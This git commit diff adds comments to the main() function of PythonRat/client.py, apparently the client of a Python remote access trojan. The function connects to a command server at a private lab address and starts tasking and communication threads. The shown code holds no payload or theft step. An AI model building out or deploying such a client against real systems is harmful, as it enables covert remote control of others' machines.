008f65f7ff882df1e39433c7b03a9161dcc5aeeb
mattman059 <mattman059@gmail.com>
2022-03-02 19:46:05 -0600

    Update client.py

--- PythonRat/client.py
+++ PythonRat/client.py
@@ -2,10 +2,16 @@ from client_class import *
 from threading import Thread
 
 def main():
+    #Provide the server IP address and port
     server_addr = '10.0.0.60'
     server_port = 12345
+
+    #Create a client object with the desired interface address and port
+    #Also provide the server information
     c = Client('10.0.0.45',54321,server_addr,server_port)
 
+
+    #Create a list to hold threads for the client tasking_thread and comms_thread
     threads = []
     
     tasking = Thread(target=c.tasking_thread)
